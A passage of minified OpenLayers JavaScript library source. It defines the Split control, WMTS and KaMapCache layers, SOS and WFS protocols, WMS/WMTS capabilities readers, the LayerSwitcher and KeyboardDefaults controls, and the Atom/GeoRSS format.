a=OpenLayers.Control.prototype.activate.call(this);if(a)if(!this.source)this.handler||(this.handler=new OpenLayers.Handler.Path(this,{done:function(a){this.onSketchComplete({feature:new OpenLayers.Feature.Vector(a)})}},{layerOptions:this.sourceOptions})),this.handler.activate();else if(this.source.events)this.source.events.on({sketchcomplete:this.onSketchComplete,afterfeaturemodified:this.afterFeatureModified,scope:this});return a},deactivate:function(){var a=OpenLayers.Control.prototype.deactivate.call(this);\na&&this.source&&this.source.events&&this.source.events.un({sketchcomplete:this.onSketchComplete,afterfeaturemodified:this.afterFeatureModified,scope:this});return a},onSketchComplete:function(a){this.feature=null;return!this.considerSplit(a.feature)},afterFeatureModified:function(a){a.modified&&\"function\"===typeof a.feature.geometry.split&&(this.feature=a.feature,this.considerSplit(a.feature))},removeByGeometry:function(a,b){for(var c=0,d=a.length;c<d;++c)if(a[c].geometry===b){a.splice(c,1);break}},\nisEligible:function(a){return a.geometry?a.state!==OpenLayers.State.DELETE&&\"function\"===typeof a.geometry.split&&this.feature!==a&&(!this.targetFilter||this.targetFilter.evaluate(a.attributes)):!1},considerSplit:function(a){var b=!1,c=!1;if(!this.sourceFilter||this.sourceFilter.evaluate(a.attributes)){for(var d=this.layer&&this.layer.features||[],e,f,g=[],h=[],k=this.layer===this.source&&this.mutual,l={edge:this.edge,tolerance:this.tolerance,mutual:k},m=[a.geometry],n,p,q,r=0,s=d.length;r<s;++r)if(n=\nd[r],this.isEligible(n)){p=[n.geometry];for(var t=0;t<m.length;++t){q=m[t];for(var u=0;u<p.length;++u)if(e=p[u],q.getBounds().intersectsBounds(e.getBounds())&&(e=q.split(e,l)))f=this.events.triggerEvent(\"beforesplit\",{source:a,target:n}),!1!==f&&(k&&(f=e[0],1<f.length&&(f.unshift(t,1),Array.prototype.splice.apply(m,f),t+=f.length-3),e=e[1]),1<e.length&&(e.unshift(u,1),Array.prototype.splice.apply(p,e),u+=e.length-3))}p&&1<p.length&&(this.geomsToFeatures(n,p),this.events.triggerEvent(\"split\",{original:n,\nfeatures:p}),Array.prototype.push.apply(g,p),h.push(n),c=!0)}m&&1<m.length&&(this.geomsToFeatures(a,m),this.events.triggerEvent(\"split\",{original:a,features:m}),Array.prototype.push.apply(g,m),h.push(a),b=!0);if(b||c){if(this.deferDelete){d=[];r=0;for(s=h.length;r<s;++r)c=h[r],c.state===OpenLayers.State.INSERT?d.push(c):(c.state=OpenLayers.State.DELETE,this.layer.drawFeature(c));this.layer.destroyFeatures(d,{silent:!0});r=0;for(s=g.length;r<s;++r)g[r].state=OpenLayers.State.INSERT}else this.layer.destroyFeatures(h,\n{silent:!0});this.layer.addFeatures(g,{silent:!0});this.events.triggerEvent(\"aftersplit\",{source:a,features:g})}}return b},geomsToFeatures:function(a,b){var c=a.clone();delete c.geometry;for(var d,e=0,f=b.length;e<f;++e)d=c.clone(),d.geometry=b[e],d.state=OpenLayers.State.INSERT,b[e]=d},destroy:function(){this.active&&this.deactivate();OpenLayers.Control.prototype.destroy.call(this)},CLASS_NAME:\"OpenLayers.Control.Split\"});OpenLayers.Layer.WMTS=OpenLayers.Class(OpenLayers.Layer.Grid,{isBaseLayer:!0,version:\"1.0.0\",requestEncoding:\"KVP\",url:null,layer:null,matrixSet:null,style:null,format:\"image/jpeg\",tileOrigin:null,tileFullExtent:null,formatSuffix:null,matrixIds:null,dimensions:null,params:null,zoomOffset:0,serverResolutions:null,formatSuffixMap:{\"image/png\":\"png\",\"image/png8\":\"png\",\"image/png24\":\"png\",\"image/png32\":\"png\",png:\"png\",\"image/jpeg\":\"jpg\",\"image/jpg\":\"jpg\",jpeg:\"jpg\",jpg:\"jpg\"},matrix:null,initialize:function(a){var b=\n{url:!0,layer:!0,style:!0,matrixSet:!0},c;for(c in b)if(!(c in a))throw Error(\"Missing property '\"+c+\"' in layer configuration.\");a.params=OpenLayers.Util.upperCaseObject(a.params);OpenLayers.Layer.Grid.prototype.initialize.apply(this,[a.name,a.url,a.params,a]);this.formatSuffix||(this.formatSuffix=this.formatSuffixMap[this.format]||this.format.split(\"/\").pop());if(this.matrixIds&&(a=this.matrixIds.length)&&\"string\"===typeof this.matrixIds[0])for(b=this.matrixIds,this.matrixIds=Array(a),c=0;c<a;++c)this.matrixIds[c]=\n{identifier:b[c]}},setMap:function(){OpenLayers.Layer.Grid.prototype.setMap.apply(this,arguments)},updateMatrixProperties:function(){if(this.matrix=this.getMatrix())this.matrix.topLeftCorner&&(this.tileOrigin=this.matrix.topLeftCorner),this.matrix.tileWidth&&this.matrix.tileHeight&&(this.tileSize=new OpenLayers.Size(this.matrix.tileWidth,this.matrix.tileHeight)),this.tileOrigin||(this.tileOrigin=new OpenLayers.LonLat(this.maxExtent.left,this.maxExtent.top)),this.tileFullExtent||(this.tileFullExtent=\nthis.maxExtent)},moveTo:function(a,b,c){!b&&this.matrix||this.updateMatrixProperties();return OpenLayers.Layer.Grid.prototype.moveTo.apply(this,arguments)},clone:function(a){null==a&&(a=new OpenLayers.Layer.WMTS(this.options));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])},getIdentifier:function(){return this.getServerZoom()},getMatrix:function(){var a;if(this.matrixIds&&0!==this.matrixIds.length)if(\"scaleDenominator\"in this.matrixIds[0])for(var b=OpenLayers.METERS_PER_INCH*OpenLayers.INCHES_PER_UNIT[this.units]*\nthis.getServerResolution()/2.8E-4,c=Number.POSITIVE_INFINITY,d,e=0,f=this.matrixIds.length;e<f;++e)d=Math.abs(1-this.matrixIds[e].scaleDenominator/b),d<c&&(c=d,a=this.matrixIds[e]);else a=this.matrixIds[this.getIdentifier()];else a={identifier:this.getIdentifier()};return a},getTileInfo:function(a){var b=this.getServerResolution(),c=(a.lon-this.tileOrigin.lon)/(b*this.tileSize.w);a=(this.tileOrigin.lat-a.lat)/(b*this.tileSize.h);var b=Math.floor(c),d=Math.floor(a);return{col:b,row:d,i:Math.floor((c-\nb)*this.tileSize.w),j:Math.floor((a-d)*this.tileSize.h)}},getURL:function(a){a=this.adjustBounds(a);var b=\"\";if(!this.tileFullExtent||this.tileFullExtent.intersectsBounds(a)){a=a.getCenterLonLat();var c=this.getTileInfo(a);a=this.dimensions;var d,b=OpenLayers.Util.isArray(this.url)?this.selectUrl([this.version,this.style,this.matrixSet,this.matrix.identifier,c.row,c.col].join(),this.url):this.url;if(\"REST\"===this.requestEncoding.toUpperCase())if(d=this.params,-1!==b.indexOf(\"{\")){b=b.replace(/\\{/g,\n\"${\");c={style:this.style,Style:this.style,TileMatrixSet:this.matrixSet,TileMatrix:this.matrix.identifier,TileRow:c.row,TileCol:c.col};if(a){var e,f;for(f=a.length-1;0<=f;--f)e=a[f],c[e]=d[e.toUpperCase()]}b=OpenLayers.String.format(b,c)}else{e=this.version+\"/\"+this.layer+\"/\"+this.style+\"/\";if(a)for(f=0;f<a.length;f++)d[a[f]]&&(e=e+d[a[f]]+\"/\");e=e+this.matrixSet+\"/\"+this.matrix.identifier+\"/\"+c.row+\"/\"+c.col+\".\"+this.formatSuffix;b.match(/\\/$/)||(b+=\"/\");b+=e}else\"KVP\"===this.requestEncoding.toUpperCase()&&\n(d={SERVICE:\"WMTS\",REQUEST:\"GetTile\",VERSION:this.version,LAYER:this.layer,STYLE:this.style,TILEMATRIXSET:this.matrixSet,TILEMATRIX:this.matrix.identifier,TILEROW:c.row,TILECOL:c.col,FORMAT:this.format},b=OpenLayers.Layer.Grid.prototype.getFullRequestString.apply(this,[d]))}return b},mergeNewParams:function(a){if(\"KVP\"===this.requestEncoding.toUpperCase())return OpenLayers.Layer.Grid.prototype.mergeNewParams.apply(this,[OpenLayers.Util.upperCaseObject(a)])},CLASS_NAME:\"OpenLayers.Layer.WMTS\"});OpenLayers.Protocol.SOS.v1_0_0=OpenLayers.Class(OpenLayers.Protocol,{fois:null,formatOptions:null,initialize:function(a){OpenLayers.Protocol.prototype.initialize.apply(this,[a]);a.format||(this.format=new OpenLayers.Format.SOSGetFeatureOfInterest(this.formatOptions))},destroy:function(){this.options&&!this.options.format&&this.format.destroy();this.format=null;OpenLayers.Protocol.prototype.destroy.apply(this)},read:function(a){a=OpenLayers.Util.extend({},a);OpenLayers.Util.applyDefaults(a,this.options||\n{});var b=new OpenLayers.Protocol.Response({requestType:\"read\"}),c=this.format,c=OpenLayers.Format.XML.prototype.write.apply(c,[c.writeNode(\"sos:GetFeatureOfInterest\",{fois:this.fois})]);b.priv=OpenLayers.Request.POST({url:a.url,callback:this.createCallback(this.handleRead,b,a),data:c});return b},handleRead:function(a,b){if(b.callback){var c=a.priv;200<=c.status&&300>c.status?(a.features=this.parseFeatures(c),a.code=OpenLayers.Protocol.Response.SUCCESS):a.code=OpenLayers.Protocol.Response.FAILURE;\nb.callback.call(b.scope,a)}},parseFeatures:function(a){var b=a.responseXML;b&&b.documentElement||(b=a.responseText);return!b||0>=b.length?null:this.format.read(b)},CLASS_NAME:\"OpenLayers.Protocol.SOS.v1_0_0\"});OpenLayers.Layer.KaMapCache=OpenLayers.Class(OpenLayers.Layer.KaMap,{IMAGE_EXTENSIONS:{jpeg:\"jpg\",gif:\"gif\",png:\"png\",png8:\"png\",png24:\"png\",dithered:\"png\"},DEFAULT_FORMAT:\"jpeg\",initialize:function(a,b,c,d){OpenLayers.Layer.KaMap.prototype.initialize.apply(this,arguments);this.extension=this.IMAGE_EXTENSIONS[this.params.i.toLowerCase()||this.DEFAULT_FORMAT]},getURL:function(a){a=this.adjustBounds(a);var b=this.map.getResolution(),c=Math.round(1E4*this.map.getScale())/1E4,d=Math.round(a.left/b);a=\n-Math.round(a.top/b);var b=Math.floor(d/this.tileSize.w/this.params.metaTileSize.w)*this.tileSize.w*this.params.metaTileSize.w,e=Math.floor(a/this.tileSize.h/this.params.metaTileSize.h)*this.tileSize.h*this.params.metaTileSize.h,c=[\"/\",this.params.map,\"/\",c,\"/\",this.params.g.replace(/\\s/g,\"_\"),\"/def/t\",e,\"/l\",b,\"/t\",a,\"l\",d,\".\",this.extension],d=this.url;OpenLayers.Util.isArray(d)&&(d=this.selectUrl(c.join(\"\"),d));return d+c.join(\"\")},CLASS_NAME:\"OpenLayers.Layer.KaMapCache\"});OpenLayers.Protocol.WFS.v1_1_0=OpenLayers.Class(OpenLayers.Protocol.WFS.v1,{version:\"1.1.0\",initialize:function(a){OpenLayers.Protocol.WFS.v1.prototype.initialize.apply(this,arguments);this.outputFormat&&!this.readFormat&&(\"gml2\"==this.outputFormat.toLowerCase()?this.readFormat=new OpenLayers.Format.GML.v2({featureType:this.featureType,featureNS:this.featureNS,geometryName:this.geometryName}):\"json\"==this.outputFormat.toLowerCase()&&(this.readFormat=new OpenLayers.Format.GeoJSON))},CLASS_NAME:\"OpenLayers.Protocol.WFS.v1_1_0\"});OpenLayers.Format.WMSCapabilities.v1_1_1=OpenLayers.Class(OpenLayers.Format.WMSCapabilities.v1_1,{version:\"1.1.1\",readers:{wms:OpenLayers.Util.applyDefaults({SRS:function(a,b){b.srs[this.getChildValue(a)]=!0}},OpenLayers.Format.WMSCapabilities.v1_1.prototype.readers.wms)},CLASS_NAME:\"OpenLayers.Format.WMSCapabilities.v1_1_1\"});OpenLayers.Format.WMSCapabilities.v1_1_1_WMSC=OpenLayers.Class(OpenLayers.Format.WMSCapabilities.v1_1_1,{version:\"1.1.1\",profile:\"WMSC\",readers:{wms:OpenLayers.Util.applyDefaults({VendorSpecificCapabilities:function(a,b){b.vendorSpecific={tileSets:[]};this.readChildNodes(a,b.vendorSpecific)},TileSet:function(a,b){var c={srs:{},bbox:{},resolutions:[]};this.readChildNodes(a,c);b.tileSets.push(c)},Resolutions:function(a,b){for(var c=this.getChildValue(a).split(\" \"),d=0,e=c.length;d<e;d++)\"\"!=c[d]&&b.resolutions.push(parseFloat(c[d]))},\nWidth:function(a,b){b.width=parseInt(this.getChildValue(a))},Height:function(a,b){b.height=parseInt(this.getChildValue(a))},Layers:function(a,b){b.layers=this.getChildValue(a)},Styles:function(a,b){b.styles=this.getChildValue(a)}},OpenLayers.Format.WMSCapabilities.v1_1_1.prototype.readers.wms)},CLASS_NAME:\"OpenLayers.Format.WMSCapabilities.v1_1_1_WMSC\"});OpenLayers.Control.LayerSwitcher=OpenLayers.Class(OpenLayers.Control,{layerStates:null,layersDiv:null,baseLayersDiv:null,baseLayers:null,dataLbl:null,dataLayersDiv:null,dataLayers:null,minimizeDiv:null,maximizeDiv:null,ascending:!0,initialize:function(a){OpenLayers.Control.prototype.initialize.apply(this,arguments);this.layerStates=[]},destroy:function(){this.clearLayersArray(\"base\");this.clearLayersArray(\"data\");this.map.events.un({buttonclick:this.onButtonClick,addlayer:this.redraw,changelayer:this.redraw,\nremovelayer:this.redraw,changebaselayer:this.redraw,scope:this});this.events.unregister(\"buttonclick\",this,this.onButtonClick);OpenLayers.Control.prototype.destroy.apply(this,arguments)},setMap:function(a){OpenLayers.Control.prototype.setMap.apply(this,arguments);this.map.events.on({addlayer:this.redraw,changelayer:this.redraw,removelayer:this.redraw,changebaselayer:this.redraw,scope:this});this.outsideViewport?(this.events.attachToElement(this.div),this.events.register(\"buttonclick\",this,this.onButtonClick)):\nthis.map.events.register(\"buttonclick\",this,this.onButtonClick)},draw:function(){OpenLayers.Control.prototype.draw.apply(this);this.loadContents();this.outsideViewport||this.minimizeControl();this.redraw();return this.div},onButtonClick:function(a){a=a.buttonElement;a===this.minimizeDiv?this.minimizeControl():a===this.maximizeDiv?this.maximizeControl():a._layerSwitcher===this.id&&(a[\"for\"]&&(a=document.getElementById(a[\"for\"])),a.disabled||(\"radio\"==a.type?(a.checked=!0,this.map.setBaseLayer(this.map.getLayer(a._layer))):\n(a.checked=!a.checked,this.updateMap())))},clearLayersArray:function(a){this[a+\"LayersDiv\"].innerHTML=\"\";this[a+\"Layers\"]=[]},checkRedraw:function(){if(!this.layerStates.length||this.map.layers.length!=this.layerStates.length)return!0;for(var a=0,b=this.layerStates.length;a<b;a++){var c=this.layerStates[a],d=this.map.layers[a];if(c.name!=d.name||c.inRange!=d.inRange||c.id!=d.id||c.visibility!=d.visibility)return!0}return!1},redraw:function(){if(!this.checkRedraw())return this.div;this.clearLayersArray(\"base\");\nthis.clearLayersArray(\"data\");var a=!1,b=!1,c=this.map.layers.length;this.layerStates=Array(c);for(var d=0;d<c;d++){var e=this.map.layers[d];this.layerStates[d]={name:e.name,visibility:e.visibility,inRange:e.inRange,id:e.id}}var f=this.map.layers.slice();this.ascending||f.reverse();d=0;for(c=f.length;d<c;d++){var e=f[d],g=e.isBaseLayer;if(e.displayInLayerSwitcher){g?b=!0:a=!0;var h=g?e==this.map.baseLayer:e.getVisibility(),k=document.createElement(\"input\"),l=OpenLayers.Util.createUniqueID(this.id+\n\"_input_\");k.id=l;k.name=g?this.id+\"_baseLayers\":e.name;k.type=g?\"radio\":\"checkbox\";k.value=e.name;k.checked=h;k.defaultChecked=h;k.className=\"olButton\";k._layer=e.id;k._layerSwitcher=this.id;g||e.inRange||(k.disabled=!0);h=document.createElement(\"label\");h[\"for\"]=k.id;OpenLayers.Element.addClass(h,\"labelSpan olButton\");h._layer=e.id;h._layerSwitcher=this.id;g||e.inRange||(h.style.color=\"gray\");h.innerHTML=e.name;h.style.verticalAlign=g?\"bottom\":\"baseline\";l=document.createElement(\"br\");(g?this.baseLayers:\nthis.dataLayers).push({layer:e,inputElem:k,labelSpan:h});e=g?this.baseLayersDiv:this.dataLayersDiv;e.appendChild(k);e.appendChild(h);e.appendChild(l)}}this.dataLbl.style.display=a?\"\":\"none\";this.baseLbl.style.display=b?\"\":\"none\";return this.div},updateMap:function(){for(var a=0,b=this.baseLayers.length;a<b;a++){var c=this.baseLayers[a];c.inputElem.checked&&this.map.setBaseLayer(c.layer,!1)}a=0;for(b=this.dataLayers.length;a<b;a++)c=this.dataLayers[a],c.layer.setVisibility(c.inputElem.checked)},maximizeControl:function(a){this.div.style.width=\n\"\";this.div.style.height=\"\";this.showControls(!1);null!=a&&OpenLayers.Event.stop(a)},minimizeControl:function(a){this.div.style.width=\"0px\";this.div.style.height=\"0px\";this.showControls(!0);null!=a&&OpenLayers.Event.stop(a)},showControls:function(a){this.maximizeDiv.style.display=a?\"\":\"none\";this.minimizeDiv.style.display=a?\"none\":\"\";this.layersDiv.style.display=a?\"none\":\"\"},loadContents:function(){this.layersDiv=document.createElement(\"div\");this.layersDiv.id=this.id+\"_layersDiv\";OpenLayers.Element.addClass(this.layersDiv,\n\"layersDiv\");this.baseLbl=document.createElement(\"div\");this.baseLbl.innerHTML=OpenLayers.i18n(\"Base Layer\");OpenLayers.Element.addClass(this.baseLbl,\"baseLbl\");this.baseLayersDiv=document.createElement(\"div\");OpenLayers.Element.addClass(this.baseLayersDiv,\"baseLayersDiv\");this.dataLbl=document.createElement(\"div\");this.dataLbl.innerHTML=OpenLayers.i18n(\"Overlays\");OpenLayers.Element.addClass(this.dataLbl,\"dataLbl\");this.dataLayersDiv=document.createElement(\"div\");OpenLayers.Element.addClass(this.dataLayersDiv,\n\"dataLayersDiv\");this.ascending?(this.layersDiv.appendChild(this.baseLbl),this.layersDiv.appendChild(this.baseLayersDiv),this.layersDiv.appendChild(this.dataLbl),this.layersDiv.appendChild(this.dataLayersDiv)):(this.layersDiv.appendChild(this.dataLbl),this.layersDiv.appendChild(this.dataLayersDiv),this.layersDiv.appendChild(this.baseLbl),this.layersDiv.appendChild(this.baseLayersDiv));this.div.appendChild(this.layersDiv);var a=OpenLayers.Util.getImageLocation(\"layer-switcher-maximize.png\");this.maximizeDiv=\nOpenLayers.Util.createAlphaImageDiv(\"OpenLayers_Control_MaximizeDiv\",null,null,a,\"absolute\");OpenLayers.Element.addClass(this.maximizeDiv,\"maximizeDiv olButton\");this.maximizeDiv.style.display=\"none\";this.div.appendChild(this.maximizeDiv);a=OpenLayers.Util.getImageLocation(\"layer-switcher-minimize.png\");this.minimizeDiv=OpenLayers.Util.createAlphaImageDiv(\"OpenLayers_Control_MinimizeDiv\",null,null,a,\"absolute\");OpenLayers.Element.addClass(this.minimizeDiv,\"minimizeDiv olButton\");this.minimizeDiv.style.display=\n\"none\";this.div.appendChild(this.minimizeDiv)},CLASS_NAME:\"OpenLayers.Control.LayerSwitcher\"});OpenLayers.Format.Atom=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{atom:\"http://www.w3.org/2005/Atom\",georss:\"http://www.georss.org/georss\"},feedTitle:\"untitled\",defaultEntryTitle:\"untitled\",gmlParser:null,xy:!1,read:function(a){\"string\"==typeof a&&(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));return this.parseFeatures(a)},write:function(a){var b;if(OpenLayers.Util.isArray(a)){b=this.createElementNSPlus(\"atom:feed\");b.appendChild(this.createElementNSPlus(\"atom:title\",{value:this.feedTitle}));\nfor(var c=0,d=a.length;c<d;c++)b.appendChild(this.buildEntryNode(a[c]))}else b=this.buildEntryNode(a);return OpenLayers.Format.XML.prototype.write.apply(this,[b])},buildContentNode:function(a){var b=this.createElementNSPlus(\"atom:content\",{attributes:{type:a.type||null}});if(a.src)b.setAttribute(\"src\",a.src);else if(\"text\"==a.type||null==a.type)b.appendChild(this.createTextNode(a.value));else if(\"html\"==a.type){if(\"string\"!=typeof a.value)throw\"HTML content must be in form of an escaped string\";b.appendChild(this.createTextNode(a.value))}else\"xhtml\"==\na.type?b.appendChild(a.value):\"xhtml\"==a.type||a.type.match(/(\\+|\\/)xml$/)?b.appendChild(a.value):b.appendChild(this.createTextNode(a.value));return b},buildEntryNode:function(a){var b=a.attributes,c=b.atom||{},d=this.createElementNSPlus(\"atom:entry\");if(c.authors)for(var e=OpenLayers.Util.isArray(c.authors)?c.authors:[c.authors],f=0,g=e.length;f<g;f++)d.appendChild(this.buildPersonConstructNode(\"author\",e[f]));if(c.categories)for(var e=OpenLayers.Util.isArray(c.categories)?c.categories:[c.categories],\nh,f=0,g=e.length;f<g;f++)h=e[f],d.appendChild(this.createElementNSPlus(\"atom:category\",{attributes:{term:h.term,scheme:h.scheme||null,label:h.label||null}}));c.content&&d.appendChild(this.buildContentNode(c.content));if(c.contributors)for(e=OpenLayers.Util.isArray(c.contributors)?c.contributors:[c.contributors],f=0,g=e.length;f<g;f++)d.appendChild(this.buildPersonConstructNode(\"contributor\",e[f]));a.fid&&d.appendChild(this.createElementNSPlus(\"atom:id\",{value:a.fid}));if(c.links)for(e=OpenLayers.Util.isArray(c.links)?\nc.links:[c.links],f=0,g=e.length;f<g;f++)h=e[f],d.appendChild(this.createElementNSPlus(\"atom:link\",{attributes:{href:h.href,rel:h.rel||null,type:h.type||null,hreflang:h.hreflang||null,title:h.title||null,length:h.length||null}}));c.published&&d.appendChild(this.createElementNSPlus(\"atom:published\",{value:c.published}));c.rights&&d.appendChild(this.createElementNSPlus(\"atom:rights\",{value:c.rights}));(c.summary||b.description)&&d.appendChild(this.createElementNSPlus(\"atom:summary\",{value:c.summary||\nb.description}));d.appendChild(this.createElementNSPlus(\"atom:title\",{value:c.title||b.title||this.defaultEntryTitle}));c.updated&&d.appendChild(this.createElementNSPlus(\"atom:updated\",{value:c.updated}));a.geometry&&(b=this.createElementNSPlus(\"georss:where\"),b.appendChild(this.buildGeometryNode(a.geometry)),d.appendChild(b));return d},initGmlParser:function(){this.gmlParser=new OpenLayers.Format.GML.v3({xy:this.xy,featureNS:\"http://example.com#feature\",internalProjection:this.internalProjection,\nexternalProjection:this.externalProjection})},buildGeometryNode:function(a){this.gmlParser||this.initGmlParser();return this.gmlParser.writeNode(\"feature:_geometry\",a).firstChild},buildPersonConstructNode:function(a,b){var c=[\"uri\",\"email\"],d=this.createElementNSPlus(\"atom:\"+a);d.appendChild(this.createElementNSPlus(\"atom:name\",{value:b.name}));for(var e=0,f=c.length;e<f;e++)b[c[e]]&&d.appendChild(this.createElementNSPlus(\"atom:\"+c[e],{value:b[c[e]]}));return d},getFirstChildValue:function(a,b,c,\nd){return(a=this.getElementsByTagNameNS(a,b,c))&&0<a.length?this.getChildValue(a[0],d):d},parseFeature:function(a){var b={},c=null,d=null,e=null,f=this.namespaces.atom;this.parsePersonConstructs(a,\"author\",b);d=this.getElementsByTagNameNS(a,f,\"category\");0<d.length&&(b.categories=[]);for(var g=0,h=d.length;g<h;g++){c={};c.term=d[g].getAttribute(\"term\");if(e=d[g].getAttribute(\"scheme\"))c.scheme=e;if(e=d[g].getAttribute(\"label\"))c.label=e;b.categories.push(c)}d=this.getElementsByTagNameNS(a,f,\"content\");\nif(0<d.length){c={};if(e=d[0].getAttribute(\"type\"))c.type=e;(e=d[0].getAttribute(\"src\"))?c.src=e:(\"text\"==c.type||\"html\"==c.type||null==c.type?c.value=this.getFirstChildValue(a,f,\"content\",null):\"xhtml\"==c.type||c.type.match(/(\\+|\\/)xml$/)?c.value=this.getChildEl(d[0]):c.value=this.getFirstChildValue(a,f,\"content\",null),b.content=c)}this.parsePersonConstructs(a,\"contributor\",b);b.id=this.getFirstChildValue(a,f,\"id\",null);d=this.getElementsByTagNameNS(a,f,\"link\");0<d.length&&(b.links=Array(d.length));\nfor(var k=[\"rel\",\"type\",\"hreflang\",\"title\",\"length\"],g=0,h=d.length;g<h;g++){c={};c.href=d[g].getAttribute(\"href\");for(var l=0,m=k.length;l<m;l++)(e=d[g].getAttribute(k[l]))&&(c[k[l]]=e);b.links[g]=c}if(c=this.getFirstChildValue(a,f,\"published\",null))b.published=c;if(c=this.getFirstChildValue(a,f,\"rights\",null))b.rights=c;if(c=this.getFirstChildValue(a,f,\"summary\",null))b.summary=c;b.title=this.getFirstChildValue(a,f,\"title\",null);b.updated=this.getFirstChildValue(a,f,\"updated\",null);c={title:b.title,\ndescription:b.summary,atom:b};a=this.parseLocations(a)[0];a=new OpenLayers.Feature.Vector(a,c);a.fid=b.id;return a},parseFeatures:function(a){var b=[],c=this.getElementsByTagNameNS(a,this.namespaces.atom,\"entry\");0==c.length&&(c=[a]);a=0;for(var d=c.length;a<d;a++)b.push(this.parseFeature(c[a]));return b},parseLocations:function(a){var b=this.namespaces.georss,c={components:[]},d=this.getElementsByTagNameNS(a,b,\"where\");if(d&&0<d.length){this.gmlParser||this.initGmlParser();for(var e=0,f=d.length;e<\nf;e++)this.gmlParser.readChildNodes(d[e],c)}c=c.components;if((d=this.getElementsByTagNameNS(a,b,\"point\"))&&0<d.length)for(e=0,f=d.length;e<f;e++){var g=OpenLayers.String.trim(d[e].firstChild.nodeValue).split(/\\s+/);2!=g.length&&(g=OpenLayers.String.trim(d[e].firstChild.nodeValue).split(/\\s*,\\s*/));c.push(new OpenLayers.Geometry.Point(g[1],g[0]))}var h=this.getElementsByTagNameNS(a,b,\"line\");if(h&&0<h.length)for(var k,e=0,f=h.length;e<f;e++){d=OpenLayers.String.trim(h[e].firstChild.nodeValue).split(/\\s+/);\nk=[];for(var l=0,m=d.length;l<m;l+=2)g=new OpenLayers.Geometry.Point(d[l+1],d[l]),k.push(g);c.push(new OpenLayers.Geometry.LineString(k))}if((a=this.getElementsByTagNameNS(a,b,\"polygon\"))&&0<a.length)for(e=0,f=a.length;e<f;e++){d=OpenLayers.String.trim(a[e].firstChild.nodeValue).split(/\\s+/);k=[];l=0;for(m=d.length;l<m;l+=2)g=new OpenLayers.Geometry.Point(d[l+1],d[l]),k.push(g);c.push(new OpenLayers.Geometry.Polygon([new OpenLayers.Geometry.LinearRing(k)]))}if(this.internalProjection&&this.externalProjection)for(e=\n0,f=c.length;e<f;e++)c[e]&&c[e].transform(this.externalProjection,this.internalProjection);return c},parsePersonConstructs:function(a,b,c){var d=[],e=this.namespaces.atom;a=this.getElementsByTagNameNS(a,e,b);for(var f=[\"uri\",\"email\"],g=0,h=a.length;g<h;g++){var k={};k.name=this.getFirstChildValue(a[g],e,\"name\",null);for(var l=0,m=f.length;l<m;l++){var n=this.getFirstChildValue(a[g],e,f[l],null);n&&(k[f[l]]=n)}d.push(k)}0<d.length&&(c[b+\"s\"]=d)},CLASS_NAME:\"OpenLayers.Format.Atom\"});OpenLayers.Control.KeyboardDefaults=OpenLayers.Class(OpenLayers.Control,{autoActivate:!0,slideFactor:75,observeElement:null,draw:function(){this.handler=new OpenLayers.Handler.Keyboard(this,{keydown:this.defaultKeyPress},{observeElement:this.observeElement||document})},defaultKeyPress:function(a){var b,c=!0;b=OpenLayers.Event.element(a);if(!b||\"INPUT\"!=b.tagName&&\"TEXTAREA\"!=b.tagName&&\"SELECT\"!=b.tagName){switch(a.keyCode){case OpenLayers.Event.KEY_LEFT:this.map.pan(-this.slideFactor,0);break;case OpenLayers.Event.KEY_RIGHT:this.map.pan(this.slideFactor,\n0);break;case OpenLayers.Event.KEY_UP:this.map.pan(0,-this.slideFactor);break;case OpenLayers.Event.KEY_DOWN:this.map.pan(0,this.slideFactor);break;case 33:b=this.map.getSize();this.map.pan(0,-0.75*b.h);break;case 34:b=this.map.getSize();this.map.pan(0,0.75*b.h);break;case 35:b=this.map.getSize();this.map.pan(0.75*b.w,0);break;case 36:b=this.map.getSize();this.map.pan(-0.75*b.w,0);break;case 43:case 61:case 187:case 107:this.map.zoomIn();break;case 45:case 109:case 189:case 95:this.map.zoomOut();\nbreak;default:c=!1}c&&OpenLayers.Event.stop(a)}},CLASS_NAME:\"OpenLayers.Control.KeyboardDefaults\"});OpenLayers.Format.WMTSCapabilities.v1_0_0=OpenLayers.Class(OpenLayers.Format.OWSCommon.v1_1_0,{version:\"1.0.0\",namespaces:{ows:\"http://www.opengis.net/ows/1.1\",wmts:\"http://www.opengis.net/wmts/1.0\",xlink:\"http://www.w3.org/1999/xlink\"},yx:null,defaultPrefix:\"wmts\",initialize:function(a){OpenLayers.Format.XML.prototype.initialize.apply(this,[a]);this.options=a;a=OpenLayers.Util.extend({},OpenLayers.Format.WMTSCapabilities.prototype.yx);this.yx=OpenLayers.Util.extend(a,this.yx)},read:function(a){\"string\"==\ntypeof a&&(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&&9==a.nodeType&&(a=a.documentElement);var b={};this.readNode(a,b);b.version=this.version;return b},readers:{wmts:{Capabilities:function(a,b){this.readChildNodes(a,b)},Contents:function(a,b){b.contents={};b.contents.layers=[];b.contents.tileMatrixSets={};this.readChildNodes(a,b.contents)},Layer:function(a,b){var c={styles:[],formats:[],dimensions:[],tileMatrixSetLinks:[],layers:[]};this.readChildNodes(a,c);b.layers.push(c)},Style:function(a,\nb){var c={};c.isDefault=\"true\"===a.getAttribute(\"isDefault\");this.readChildNodes(a,c);b.styles.push(c)},Format:function(a,b){b.formats.push(this.getChildValue(a))},TileMatrixSetLink:function(a,b){var c={};this.readChildNodes(a,c);b.tileMatrixSetLinks.push(c)},TileMatrixSet:function(a,b){if(b.layers){var c={matrixIds:[]};this.readChildNodes(a,c);b.tileMatrixSets[c.identifier]=c}else b.tileMatrixSet=this.getChildValue(a)},TileMatrix:function(a,b){var c={supportedCRS:b.supportedCRS};this.readChildNodes(a,\nc);b.matrixIds.push(c)},ScaleDenominator:function(a,b){b.scaleDenominator=parseFloat(this.getChildValue(a))},TopLeftCorner:function(a,b){var c=this.getChildValue(a).split(\" \"),d;b.supportedCRS&&(d=b.supportedCRS.replace(/urn:ogc:def:crs:(\\w+):.+:(\\w+)$/,\"urn:ogc:def:crs:$1::$2\"),d=!!this.yx[d]);b.topLeftCorner=d?new OpenLayers.LonLat(c[1],c[0]):new OpenLayers.LonLat(c[0],c[1])},TileWidth:function(a,b){b.tileWidth=parseInt(this.getChildValue(a))},TileHeight:function(a,b){b.tileHeight=parseInt(this.getChildValue(a))},\nMatrixWidth:function(a,b){b.matrixWidth=parseInt(this.getChildValue(a))},MatrixHeight:function(a,b){b.matrixHeight=parseInt(this.getChildValue(a))},ResourceURL:function(a,b){b.resourceUrl=b.resourceUrl||{};var 